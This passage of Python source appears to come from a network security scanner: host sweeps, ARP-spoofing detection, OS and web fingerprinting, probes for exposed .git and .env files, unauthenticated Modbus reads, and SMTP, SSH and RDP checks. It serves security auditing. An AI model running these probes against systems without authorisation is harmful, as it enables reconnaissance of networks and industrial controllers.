    if not hosts:
        return live

    def _cksum(data: bytes) -> int:
        """Internet checksum (RFC 1071)."""
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) | data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return (~s) & 0xFFFF

    # Check privilege once before spawning threads
    use_raw = False
    try:
        _t = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        _t.close()
        use_raw = True
    except PermissionError:
        pass

    ident = os.getpid() & 0xFFFF

    def _probe(host: str, seq: int) -> None:
        if use_raw:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(timeout)
                # ICMP echo request: type=8, code=0
                hdr = struct.pack('!BBHHH', 8, 0, 0, ident, seq & 0xFFFF)
                cksum = _cksum(hdr)
                pkt = struct.pack('!BBHHH', 8, 0, cksum, ident, seq & 0xFFFF)
                t0 = time.monotonic()
                sock.sendto(pkt, (host, 0))
                deadline = t0 + timeout
                while time.monotonic() < deadline:
                    remaining = deadline - time.monotonic()
                    if remaining <= 0:
                        break
                    try:
                        sock.settimeout(remaining)
                        raw_pkt, (src_ip, _) = sock.recvfrom(1024)
                        if src_ip != host:
                            continue   # packet from a different host
                        latency_ms = round((time.monotonic() - t0) * 1000, 2)
                        ihl = (raw_pkt[0] & 0xF) * 4
                        ttl = raw_pkt[8]
                        # type=0 is echo reply; verify ident+seq to confirm ownership
                        if len(raw_pkt) >= ihl + 8 and raw_pkt[ihl] == 0:
                            reply_ident = (raw_pkt[ihl + 4] << 8) | raw_pkt[ihl + 5]
                            reply_seq   = (raw_pkt[ihl + 6] << 8) | raw_pkt[ihl + 7]
                            if reply_ident == ident and reply_seq == (seq & 0xFFFF):
                                with lock:
                                    live.append({
                                        'host':       host,
                                        'latency_ms': latency_ms,
                                        'ttl':        ttl,
                                    })
                                break
                    except OSError:
                        break
                sock.close()
            except OSError:
                pass
        else:
            # Fallback: TCP/80 SYN-connect (no raw-socket privilege)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                t0 = time.monotonic()
                sock.connect((host, 80))
                latency_ms = round((time.monotonic() - t0) * 1000, 2)
                sock.close()
                with lock:
                    live.append({'host': host, 'latency_ms': latency_ms, 'ttl': 0})
            except OSError:
                pass

    threads = []
    for seq, host in enumerate(hosts):
        t = threading.Thread(target=_probe, args=(host, seq), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=timeout + 1.0)

    return live


def detect_arp_spoofing(interface: str = "eth0") -> list:
    """
    Analyse the kernel ARP cache for spoofing indicators.

    Checks performed:
    - **ARP_DUPLICATE_MAC**: same MAC bound to multiple IPs (CRITICAL).
    - **ARP_NULL_MAC**: 00:00:00:00:00:00 entry (HIGH — cache poisoning).
    - **GATEWAY_MAC_CHANGED**: gateway MAC also claimed by another IP (HIGH).

    Args:
        interface: Network interface to filter on.  Falls back to all
                   entries when no entries exist for the named interface.

    Returns:
        List of finding dicts::

            [{'severity': str, 'title': str, 'detail': str,
              'host': str, 'port': int}, ...]
    """
    findings: list = []

    # Reuse existing /proc/net/arp reader rather than duplicating the parse
    all_entries = _arp_read()
    entries = [e for e in all_entries if e['interface'] == interface] or all_entries

    if not entries:
        return findings

    ip_to_mac: dict = {}
    mac_to_ips: dict = {}
    for e in entries:
        ip  = e['ip']
        mac = e['mac']
        ip_to_mac[ip] = mac
        mac_to_ips.setdefault(mac, []).append(ip)

    _NULL_MAC = '00:00:00:00:00:00'

    # 1. Null MAC entries — incomplete or poisoned cache lines
    for ip, mac in ip_to_mac.items():
        if mac == _NULL_MAC:
            findings.append({
                'severity': 'HIGH',
                'title':    'ARP_NULL_MAC — cache poisoning indicator',
                'detail':   (f'ARP entry for {ip} holds null MAC '
                             f'(00:00:00:00:00:00) on {interface}'),
                'host':     ip,
                'port':     0,
            })

    # 2. Duplicate MACs — same hardware address mapped to multiple IPs
    for mac, ips in mac_to_ips.items():
        if mac == _NULL_MAC:
            continue
        unique_ips = sorted(set(ips))
        if len(unique_ips) > 1:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ARP_DUPLICATE_MAC — spoofing active',
                'detail':   (f'MAC {mac} bound to {len(unique_ips)} IPs: '
                             f'{", ".join(unique_ips)}'),
                'host':     unique_ips[0],
                'port':     0,
            })

    # 3. Gateway MAC consistency — routing table vs ARP cache
    gw_ip: str = ''
    try:
        with open('/proc/net/route', 'r') as _fh:
            for line in _fh.readlines()[1:]:
                parts = line.split()
                # Default route: Destination == 00000000, Gateway != 00000000
                if (len(parts) >= 3
                        and parts[1] == '00000000'
                        and parts[2] != '00000000'):
                    # Kernel stores gateway as little-endian hex
                    gw_bytes = bytes.fromhex(parts[2])[::-1]
                    gw_ip = socket.inet_ntoa(gw_bytes)
                    break
    except OSError:
        pass

    if gw_ip and gw_ip in ip_to_mac:
        gw_mac = ip_to_mac[gw_ip]
        imposters = sorted(ip for ip in mac_to_ips.get(gw_mac, []) if ip != gw_ip)
        if imposters:
            findings.append({
                'severity': 'HIGH',
                'title':    'GATEWAY_MAC_CHANGED',
                'detail':   (f'Gateway {gw_ip} MAC {gw_mac} also claimed by: '
                             f'{", ".join(imposters)}'),
                'host':     gw_ip,
                'port':     0,
            })

    return findings


def fingerprint_os_from_ttl(host: str, port: int = 80, timeout: float = 3.0) -> dict:
    """
    OS fingerprint via TTL and TCP window size from raw IP/TCP headers.

    Captures the SYN-ACK using a raw TCP socket (requires CAP_NET_RAW) to
    read the TTL field and TCP window size.  Falls back to a plain
    SOCK_STREAM connect (confidence='low') when the privilege is absent.

    TTL heuristics (observed TTL -> inferred original TTL -> OS):
        255       -> Cisco / Network Device
        > 128     -> Cisco / Network Device (degraded from 255)
        65 - 128  -> Windows (original 128)
        60        -> FreeBSD (older, original 60) or Linux 4 hops away
        1 - 64    -> Linux / Android / macOS (original 64)

    Returns:
        {
            'host':       str,
            'os_guess':   str,
            'ttl':        int,   -- 0 if not obtained,
            'confidence': str,   -- 'low' / 'medium' / 'high',
        }
    """
    result: dict = {
        'host':       host,
        'os_guess':   'unknown',
        'ttl':        0,
        'confidence': 'low',
    }

    def _ttl_to_os(ttl: int, window: int = 0) -> tuple:
        """Map observed TTL (and optional TCP window) to (os_guess, confidence)."""
        if ttl <= 0:
            return 'unknown', 'low'
        if ttl == 255:
            return 'Cisco / Network Device', 'high'
        if ttl > 128:
            return 'Cisco / Network Device', 'medium'
        if ttl > 64:
            # 65-128 implies original TTL 128 (Windows)
            conf = 'high' if (ttl >= 120 or window in (8192, 65535)) else 'medium'
            return 'Windows', conf
        # 1-64 range
        if ttl == 60:
            # FreeBSD default is 60; could also be Linux 4 hops away
            if window in (4096, 16384):
                return 'FreeBSD (older)', 'medium'
            return 'FreeBSD (older) or Linux', 'low'
        # 61-64: Linux / macOS / Android (original 64)
        conf = 'high' if (ttl == 64 and window in (43690, 5840, 65535)) else 'medium'
        return 'Linux / Android / macOS', conf

    # Strategy 1: raw TCP socket — capture SYN-ACK, extract TTL + window size
    ttl_obtained    = 0
    window_obtained = 0

    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        raw.settimeout(timeout)

        # Trigger SYN-ACK via normal connect in a daemon thread
        _stop = threading.Event()

        def _connect() -> None:
            try:
                s = socket.create_connection((host, port), timeout=timeout)
                s.close()
            except OSError:
                pass
            finally:
                _stop.set()

        ct = threading.Thread(target=_connect, daemon=True)
        ct.start()

        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline and not _stop.is_set():
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                raw.settimeout(remaining)
                pkt, (src_ip, _) = raw.recvfrom(65535)
                if src_ip != host or len(pkt) < 20:
                    continue
                if pkt[9] != _PROTO_TCP:
                    continue
                ihl = (pkt[0] & 0xF) * 4
                if len(pkt) < ihl + 20:
                    continue
                tcp_flags = pkt[ihl + 13]
                # SYN-ACK = SYN(0x02) | ACK(0x10) = 0x12
                if tcp_flags & 0x12 != 0x12:
                    continue
                ttl_obtained    = pkt[8]
                window_obtained = (pkt[ihl + 14] << 8) | pkt[ihl + 15]
                break
            except OSError:
                break

        raw.close()
        ct.join(timeout=1.0)

    except PermissionError:
        pass
    except OSError:
        pass

    if ttl_obtained > 0:
        os_g, conf = _ttl_to_os(ttl_obtained, window_obtained)
        result.update({'ttl': ttl_obtained, 'os_guess': os_g, 'confidence': conf})
        return result

    # Strategy 2: plain connect — liveness only, no TTL signal available
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        result['confidence'] = 'low'
    except OSError:
        pass

    return result


# ---------------------------------------------------------------------------
# Web application fingerprinting
# Source: Security with Go — Ch. 245-247 (Fingerprinting Web Application
#         Technology Stacks, Fingerprinting Based on HTTP Response Headers,
#         Fingerprinting Web Applications) + Ch. 217 (Adding Secure HTTP Headers)
# ---------------------------------------------------------------------------

import ssl as _ssl
import json as _json

_SECURITY_HEADERS = [
    "X-Frame-Options",
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection",
]

_WAF_SIGNATURES = {
    "Cloudflare":   ["cloudflare", "__cfduid", "cf-ray"],
    "ModSecurity":  ["mod_security", "modsecurity", "NOYB"],
    "NAXSI":        ["naxsi", "nginx-naxsi"],
}


def _http_get(host: str, port: int, path: str, timeout: float):
    """Return (status_code, headers_dict_lower, body_str) or None on error."""
    use_ssl = port in (443, 8443) or port >= 10000
    ctx = _ssl.create_default_context() if use_ssl else None
    if ctx:
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{host}:{port}{path}"
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(65536).decode("utf-8", errors="replace")
            hdrs = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, hdrs, body
    except urllib.error.HTTPError as e:
        body = e.read(16384).decode("utf-8", errors="replace") if e.fp else ""
        hdrs = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        return e.code, hdrs, body
    except Exception:
        return None


def detect_web_application_fingerprint(
    host: str, port: int = 443, timeout: float = 5.0
) -> dict:
    """Fingerprint a web application from HTTP response signals.

    Sends GET / and GET /robots.txt; inspects headers, cookies, and body for
    framework markers and missing security headers.  WAF detection checks body
    and header values for known WAF signatures on 403 responses.

    Returns dict keys: host, port, framework, server_header,
    missing_headers (list), waf_detected (bool).

    Source chapters: 245-247 (fingerprinting), 217 (secure headers).
    """
    result: dict = {
        "host":            host,
        "port":            port,
        "framework":       "unknown",
        "server_header":   "",
        "missing_headers": [],
        "waf_detected":    False,
    }

    # --- collect responses ---
    root    = _http_get(host, port, "/",           timeout)
    robots  = _http_get(host, port, "/robots.txt", timeout)

    if root is None and robots is None:
        return result

    # merge headers from both responses (root takes priority)
    all_hdrs: dict = {}
    for resp in (robots, root):
        if resp:
            all_hdrs.update(resp[1])

    root_body   = root[2]   if root   else ""
    root_status = root[0]   if root   else 0
    root_hdrs   = root[1]   if root   else {}

    # --- server header ---
    result["server_header"] = all_hdrs.get("server", "")

    # --- framework detection ---
    # Priority: explicit generator/powered-by headers, then cookie names, then body
    framework = "unknown"

    xpb  = all_hdrs.get("x-powered-by", "").lower()
    xgen = all_hdrs.get("x-generator",  "").lower()
    via  = all_hdrs.get("via",           "").lower()

    # Header-based (highest confidence -- from ch.246)
    if "drupal" in xgen or "drupal" in xpb:
        framework = "Drupal"
    elif "wordpress" in xgen or "wordpress" in xpb:
        framework = "WordPress"
    elif "joomla" in xgen or "joomla" in xpb:
        framework = "Joomla"
    elif "django" in xpb or "django" in via:
        framework = "Django"
    elif "rails" in xpb or "phusion" in xpb:
        framework = "Ruby on Rails"
    elif "asp.net" in xpb:
        framework = "ASP.NET"
    elif "php" in xpb:
        framework = "PHP"
    elif "express" in xpb:
        framework = "Express.js"

    # Cookie-based (from ch.246 session-cookie fingerprinting)
    if framework == "unknown":
        set_cookie = all_hdrs.get("set-cookie", "").lower()
        if "phpsessid" in set_cookie:
            framework = "PHP"
        elif "jsessionid" in set_cookie:
            framework = "Java/JSP"
        elif "asp.net_sessionid" in set_cookie:
            framework = "ASP.NET"
        elif "django" in set_cookie or "csrftoken" in set_cookie:
            framework = "Django"
        elif "laravel_session" in set_cookie:
            framework = "Laravel"

    # Body-based (from ch.247 -- app-level fingerprinting)
    if framework == "unknown" and root_body:
        body_l = root_body.lower()
        if "wp-content" in body_l or "wp-includes" in body_l:
            framework = "WordPress"
        elif "/sites/default" in body_l or "drupal.js" in body_l:
            framework = "Drupal"
        elif "ng-app" in body_l or "ng-controller" in body_l:
            framework = "AngularJS"
        elif "react" in body_l and ("__react" in root_body or "data-reactroot" in root_body):
            framework = "React"
        elif "joomla" in body_l:
            framework = "Joomla"

    # Generator meta tag
    if framework == "unknown" and root_body:
        m = re.search(
            r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']',
            root_body, re.IGNORECASE)
        if not m:
            m = re.search(
                r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']generator["\']',
                root_body, re.IGNORECASE)
        if m:
            gen = m.group(1).strip()
            framework = gen.split()[0] if gen else framework

    result["framework"] = framework

    # --- missing security headers (from ch.217) ---
    result["missing_headers"] = [
        h for h in _SECURITY_HEADERS if h.lower() not in all_hdrs
    ]

    # --- WAF detection (403 + signature sweep) ---
    if root_status == 403:
        combined = root_body.lower() + " " + " ".join(root_hdrs.values()).lower()
        for waf_name, sigs in _WAF_SIGNATURES.items():
            if any(sig.lower() in combined for sig in sigs):
                result["waf_detected"] = True
                result["waf_name"]     = waf_name
                break
        if not result["waf_detected"]:
            # Generic: non-trivial 403 body referencing the status code
            if len(root_body) > 200 and "403" in root_body:
                result["waf_detected"] = True

    return result


# ---------------------------------------------------------------------------
# Web directory listing and sensitive-path probe
# Source: Security with Go — Ch. 243 (Finding Unlisted Files on a Web Server)
#         + Ch. 247 (Fingerprinting Web Applications)
# ---------------------------------------------------------------------------

_PROBE_PATHS = [
    "/",
    "/uploads/",
    "/backup/",
    "/admin/",
    "/api/",
    "/config/",
    "/.git/",
    "/tmp/",
    "/files/",
    "/static/",
]

_DIR_LISTING_MARKERS = [
    "index of",
    "directory listing",
    "parent directory",
    "[to parent directory]",
]


def probe_web_directory_listing(
    host: str, port: int = 443, timeout: float = 5.0
) -> list:
    """Probe for exposed directory listings and sensitive file leaks.

    Checks ten common paths for open directory listings, then probes
    .git/HEAD, .env, and Swagger spec endpoints for critical exposures.

    Returns list of dicts: {severity, title, detail, host, port}.

    Source chapters: 243 (finding unlisted files / DirBuster clone),
    247 (fingerprinting -- changelog/readme/git exposure).
    """
    findings: list = []

    def _finding(severity: str, title: str, detail: str) -> dict:
        return {"severity": severity, "title": title,
                "detail": detail, "host": host, "port": port}

    # --- directory listing sweep ---
    for path in _PROBE_PATHS:
        resp = _http_get(host, port, path, timeout)
        if resp is None:
            continue
        status, _, body = resp
        if status == 200 and body:
            body_l = body.lower()
            if any(marker in body_l for marker in _DIR_LISTING_MARKERS):
                findings.append(_finding(
                    "CRITICAL",
                    "DIRECTORY_LISTING_ENABLED",
                    f"Directory listing active at {path} -- file tree exposed",
                ))

    # --- .git/HEAD exposure ---
    resp = _http_get(host, port, "/.git/HEAD", timeout)
    if resp is not None:
        status, _, body = resp
        if status == 200 and "ref: refs/heads/" in body:
            findings.append(_finding(
                "CRITICAL",
                "GIT_REPO_EXPOSED",
                "Source code leak -- /.git/HEAD returned valid git ref",
            ))

    # --- .env file exposure ---
    resp = _http_get(host, port, "/.env", timeout)
    if resp is not None:
        status, _, body = resp
        if status == 200 and re.search(r'^[A-Z_]+=.+', body, re.MULTILINE):
            findings.append(_finding(
                "CRITICAL",
                "ENV_FILE_EXPOSED",
                "Credentials leak -- /.env returned KEY=VALUE environment data",
            ))

    # --- Swagger / OpenAPI spec exposure ---
    swagger_paths = [
        "/api/swagger.json",
        "/swagger/v1/swagger.json",
        "/openapi.json",
        "/api-docs",
    ]
    for path in swagger_paths:
        resp = _http_get(host, port, path, timeout)
        if resp is None:
            continue
        status, hdrs, body = resp
        ct = hdrs.get("content-type", "").lower()
        if status == 200 and ("json" in ct or body.lstrip().startswith("{")):
            try:
                doc = _json.loads(body)
                if "swagger" in doc or "openapi" in doc or "paths" in doc:
                    findings.append(_finding(
                        "HIGH",
                        "SWAGGER_SPEC_EXPOSED",
                        f"OpenAPI spec at {path} -- full API surface enumerable",
                    ))
                    break
            except (ValueError, KeyError):
                pass

    return findings


# ---------------------------------------------------------------------------
# ICS/OT protocol detection
# ---------------------------------------------------------------------------

def probe_modbus_exposure(host: str, port: int = 502, timeout: float = 5.0) -> list:
    """Probe for unauthenticated Modbus/TCP industrial control protocol access.

    Sends Modbus TCP Read Coils (func 1) and Read Holding Registers (func 3)
    requests. Modbus has zero built-in authentication; any response confirms
    a live PLC/RTU reachable without credentials.

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _finding(severity: str, title: str, detail: str) -> dict:
        return {"severity": severity, "title": title,
                "detail": detail, "host": host, "port": port}

    # --- TCP connect ---
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
    except (OSError, socket.timeout):
        return findings

    findings.append(_finding(
        "HIGH",
        "MODBUS_PORT_OPEN",
        "industrial control protocol exposed -- Modbus/TCP port 502 accepts connections",
    ))

    def _modbus_send_recv(s, pdu: bytes) -> Optional[bytes]:
        try:
            s.sendall(pdu)
            resp = s.recv(256)
            return resp if len(resp) >= 8 else None
        except (OSError, socket.timeout):
            return None

    # Modbus TCP Application Protocol (MBAP) header:
    #   transaction_id(2) + protocol_id(2, always 0) + length(2) + unit_id(1)
    # PDU: function_code(1) + data
    #
    # Read Coils (func=0x01): start_addr=0x0000, quantity=0x0008
    read_coils = struct.pack(">HHHBBHH", 1, 0, 6, 1, 0x01, 0x0000, 0x0008)
    resp = _modbus_send_recv(sock, read_coils)
    if resp is not None:
        func_byte = resp[7]
        if func_byte == 0x01:
            findings.append(_finding(
                "CRITICAL",
                "MODBUS_READ_COILS_UNAUTH",
                "PLC coil state readable without authentication -- "
                "Modbus function 1 (Read Coils) returned coil data",
            ))
        elif func_byte == (0x01 | 0x80):
            findings.append(_finding(
                "HIGH",
                "MODBUS_EXCEPTION_RESPONSE",
                "Modbus device responding with exception -- device active and speaking Modbus protocol",
            ))

    # Read Holding Registers (func=0x03): start_addr=0x0000, quantity=0x000A
    read_regs = struct.pack(">HHHBBHH", 2, 0, 6, 1, 0x03, 0x0000, 0x000A)
    resp = _modbus_send_recv(sock, read_regs)
    if resp is not None:
        func_byte = resp[7]
        if func_byte == 0x03:
            findings.append(_finding(
                "CRITICAL",
                "MODBUS_REGISTERS_UNAUTH",
                "PLC register data readable without authentication -- "
                "Modbus function 3 (Read Holding Registers) returned register values",
            ))
        elif func_byte == (0x03 | 0x80):
            if not any(f["title"] == "MODBUS_EXCEPTION_RESPONSE" for f in findings):
                findings.append(_finding(
                    "HIGH",
                    "MODBUS_EXCEPTION_RESPONSE",
                    "Modbus device responding with exception -- device active and speaking Modbus protocol",
                ))

    sock.close()
    return findings


# ---------------------------------------------------------------------------
# Email service scanning
# ---------------------------------------------------------------------------

def probe_smtp_exposure(host: str, port: int = 25, timeout: float = 5.0) -> list:
    """Probe for SMTP email service misconfigurations.

    Checks banner disclosure, missing STARTTLS, absent AUTH enforcement,
    VRFY user enumeration, and port 587 submission open-relay posture.

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _finding(severity: str, title: str, detail: str, p: int = port) -> dict:
        return {"severity": severity, "title": title,
                "detail": detail, "host": host, "port": p}

    def _smtp_connect(h: str, p: int, t: float) -> Optional[socket.socket]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(t)
            s.connect((h, p))
            return s
        except (OSError, socket.timeout):
            return None

    def _recv(s: socket.socket, bufsize: int = 4096) -> str:
        try:
            return s.recv(bufsize).decode("utf-8", errors="replace")
        except (OSError, socket.timeout):
            return ""

    def _send(s: socket.socket, cmd: str) -> str:
        try:
            s.sendall((cmd + "\r\n").encode())
            return s.recv(4096).decode("utf-8", errors="replace")
        except (OSError, socket.timeout):
            return ""

    # --- Port 25 probe ---
    sock25 = _smtp_connect(host, port, timeout)
    if sock25 is not None:
        banner = _recv(sock25)
        if banner.startswith("220"):
            banner_line = banner.split("\r\n")[0].strip()
            findings.append(_finding("INFO", "SMTP_BANNER",
                                     f"SMTP service banner: {banner_line}", port))

            ehlo_resp = _send(sock25, "EHLO probe.local")
            ehlo_upper = ehlo_resp.upper()

            if "AUTH" not in ehlo_upper:
                findings.append(_finding(
                    "MEDIUM",
                    "SMTP_NO_AUTH",
                    "SMTP EHLO lists no AUTH extension -- unauthenticated relay may be possible",
                    port,
                ))

            if "STARTTLS" not in ehlo_upper:
                findings.append(_finding(
                    "HIGH",
                    "SMTP_NO_STARTTLS",
                    "STARTTLS not advertised in EHLO response -- email transmitted in plaintext",
                    port,
                ))

            vrfy_resp = _send(sock25, "VRFY admin")
            if vrfy_resp.startswith("252") or vrfy_resp.startswith("250"):
                findings.append(_finding(
                    "HIGH",
                    "SMTP_USER_ENUM",
                    "VRFY command reveals valid users -- "
                    f"server responded: {vrfy_resp.split(chr(10))[0].strip()}",
                    port,
                ))

        sock25.close()

    # --- Port 587 submission relay check ---
    if port != 587:
        sock587 = _smtp_connect(host, 587, timeout)
        if sock587 is not None:
            banner587 = _recv(sock587)
            if banner587.startswith("220"):
                ehlo587 = _send(sock587, "EHLO probe.local")
                if "AUTH" not in ehlo587.upper():
                    findings.append(_finding(
                        "HIGH",
                        "SMTP_SUBMISSION_OPEN_RELAY",
                        "Port 587 (submission) accepts connections without requiring AUTH -- open relay risk",
                        587,
                    ))
            sock587.close()

    return findings

    return findings


def probe_ssh_configuration(host: str, port: int = 22, timeout: float = 5.0) -> list:
    """
    TCP banner grab + RFC 4253 SSH_MSG_KEXINIT passive read: assess SSH version
    fingerprint and key-exchange algorithm exposure.

    Source: Security with Go ch.11 (SSH; RFC 4253 transport-layer protocol,
            KEX algorithm name-list encoding); ch.16 (banner-grab socket pattern
            from grabbing-a-banner-from-a-service.md).
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": port}

    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return findings

    try:
        sock.settimeout(timeout)
        _buf = b""

        # --- banner read (server speaks first per RFC 4253 s4.2) ---
        while b"\n" not in _buf:
            chunk = sock.recv(256)
            if not chunk:
                break
            _buf += chunk
            if len(_buf) > 512:
                break

        # split banner from any leftover bytes (server may batch banner + KEXINIT)
        if b"\n" in _buf:
            nl_idx = _buf.index(b"\n") + 1
            banner_line = _buf[:nl_idx]
            _buf = _buf[nl_idx:]
        else:
            banner_line = _buf
            _buf = b""

        banner = banner_line.decode("ascii", errors="replace").strip()

        if "SSH-2.0-OpenSSH" in banner:
            findings.append(_f("INFO", "SSH_BANNER", f"SSH_BANNER -- {banner}"))
            if "OpenSSH_7" in banner or "OpenSSH_6" in banner:
                findings.append(_f(
                    "HIGH", "OUTDATED_SSH_VERSION",
                    f"OUTDATED_SSH_VERSION -- {banner}",
                ))

        if "dropbear" in banner.lower():
            findings.append(_f(
                "MEDIUM", "DROPBEAR_SSH",
                "DROPBEAR_SSH -- embedded SSH server (IoT/router context)",
            ))

        # send our version string so the server emits SSH_MSG_KEXINIT
        sock.sendall(b"SSH-2.0-OpenSSH_8.0\r\n")

        # --- read server's SSH_MSG_KEXINIT binary packet ---
        # RFC 4253 s6 packet layout:
        #   uint32  packet_length      (covers pad_len + payload + padding)
        #   byte    padding_length
        #   byte[]  payload
        #   byte[]  random padding
        while len(_buf) < 5:
            chunk = sock.recv(512)
            if not chunk:
                break
            _buf += chunk

        if len(_buf) < 5:
            return findings

        pkt_len = struct.unpack(">I", _buf[:4])[0]
        pad_len = _buf[4]
        total_pkt = 4 + pkt_len           # full on-wire size including length field
        payload_len = pkt_len - 1 - pad_len

        while len(_buf) < total_pkt:
            chunk = sock.recv(512)
            if not chunk:
                break
            _buf += chunk

        if len(_buf) < total_pkt or payload_len < 17:
            return findings

        payload = _buf[5: 5 + payload_len]

        # RFC 4253 s7.1 SSH_MSG_KEXINIT (20) payload:
        #   byte      SSH_MSG_KEXINIT (20)
        #   byte[16]  cookie
        #   name-list kex_algorithms   <-- only field parsed here
        if payload[0] != 20:
            return findings

        offset = 17  # skip msg_type (1) + cookie (16)
        if offset + 4 > payload_len:
            return findings

        kex_list_len = struct.unpack(">I", payload[offset: offset + 4])[0]
        offset += 4
        if offset + kex_list_len > payload_len:
            return findings

        kex_str = payload[offset: offset + kex_list_len].decode("ascii", errors="replace")
        _weak_kex = frozenset([
            "diffie-hellman-group1-sha1",
            "diffie-hellman-group14-sha1",
        ])
        for alg in (a.strip() for a in kex_str.split(",")):
            if alg in _weak_kex:
                findings.append(_f(
                    "HIGH", "WEAK_KEX_ALGORITHM",
                    f"WEAK_KEX_ALGORITHM -- {alg}",
                ))

    except OSError:
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass

    return findings


def detect_rdp_exposure(host: str, port: int = 3389, timeout: float = 5.0) -> list:
    """
    RDP exposure probe: TPKT/X.224 Connection Request handshake + NLA flag
    verification + TLS certificate self-signed detection.

    Source: Security with Go ch.16 (host-discovery and port-scanning patterns,
            263-port-scanning.md, 264-grabbing-a-banner-from-a-service.md);
            MS-RDPBCGR s2.2.1.1 (TPKT/X.224 CRPDU, RDP Negotiation
            Request/Response, selected-protocol encoding).
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": port}

    # --- TCP liveness ---
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return findings

    findings.append(_f("HIGH", "RDP_PORT_OPEN",
                       "RDP_PORT_OPEN -- Remote Desktop exposed"))

    # --- TPKT/X.224 CRPDU + RDP Negotiation Request (MS-RDPBCGR s2.2.1.1) ---
    # Requests PROTOCOL_SSL(0x01)|PROTOCOL_HYBRID/NLA(0x02) so the server
    # returns a Negotiation Response with its selected security protocol.
    _cr_pdu = (
        b"\x03\x00\x00\x13"          # TPKT header: version=3, reserved=0, length=19
        b"\x0e"                      # X.224 LI=14
        b"\xe0"                      # CRPDU type
        b"\x00\x00"                  # DST-REF
        b"\x00\x00"                  # SRC-REF
        b"\x00"                      # class 0
        b"\x01\x00\x08\x00"          # RDP Neg Req: type=1, flags=0, length=8
        b"\x03\x00\x00\x00"          # requested protocols: SSL | CredSSP/NLA
    )

    cc_pdu = b""
    try:
        sock.settimeout(timeout)
        sock.sendall(_cr_pdu)
        while len(cc_pdu) < 19:
            chunk = sock.recv(64)
            if not chunk:
                break
            cc_pdu += chunk
    except OSError:
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass

    # Validate CC PDU: TPKT version=3 at byte 0, X.224 CC type=0xD0 at byte 5
    if len(cc_pdu) >= 6 and cc_pdu[0] == 0x03 and cc_pdu[5] == 0xD0:
        findings.append(_f("CRITICAL", "RDP_SERVICE_CONFIRMED",
                           "RDP_SERVICE_CONFIRMED -- RDP handshake successful"))

        # RDP Negotiation Response at offset 11: type(1) flags(1) len(2) protocol(4)
        # type=0x02 means TYPE_RDP_NEG_RSP; selected protocol is LE uint32 at offset 15
        if len(cc_pdu) >= 19 and cc_pdu[11] == 0x02:
            selected = struct.unpack("<I", cc_pdu[15:19])[0]
            # NLA requires PROTOCOL_HYBRID(0x02) or PROTOCOL_HYBRID_EX(0x10)
            if not (selected & 0x00000012):
                findings.append(_f(
                    "HIGH", "RDP_NO_NLA",
                    "RDP_NO_NLA -- Network Level Auth disabled, pre-auth attack surface",
                ))

    # --- TLS certificate check (separate connection, RDP-negotiated TLS) ---
    # Request PROTOCOL_SSL only; after CC PDU the server expects a TLS ClientHello.
    _cr_ssl = (
        b"\x03\x00\x00\x13"
        b"\x0e\xe0\x00\x00\x00\x00\x00"
        b"\x01\x00\x08\x00"
        b"\x01\x00\x00\x00"          # PROTOCOL_SSL only
    )
    try:
        with socket.create_connection((host, port), timeout=timeout) as raw:
            raw.settimeout(timeout)
            raw.sendall(_cr_ssl)
            # Consume the CC PDU so the socket is positioned for TLS handshake
            _cc = b""
            while len(_cc) < 11:
                chunk = raw.recv(32)
                if not chunk:
                    break
                _cc += chunk
            if len(_cc) >= 6 and _cc[5] == 0xD0:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_REQUIRED
                try:
                    with ctx.wrap_socket(raw, server_hostname=host):
                        pass  # cert passed system CA store -- not self-signed
                except _ssl.SSLCertVerificationError:
                    findings.append(_f(
                        "MEDIUM", "RDP_SELF_SIGNED_CERT",
                        "RDP_SELF_SIGNED_CERT -- man-in-the-middle risk",
                    ))
    except (_ssl.SSLError, OSError):
        pass

    return findings


# ---------------------------------------------------------------------------


def probe_snmp_community_strings(
    host: str, port: int = 161, timeout: float = 5.0
) -> list:
    """Enumerate SNMPv1 community strings via UDP GetRequest for sysDescr OID.

    BER-encodes a minimal SNMPv1 GetRequest for OID 1.3.6.1.2.1.1.1.0
    (sysDescr) and sends it via UDP to each candidate community string.
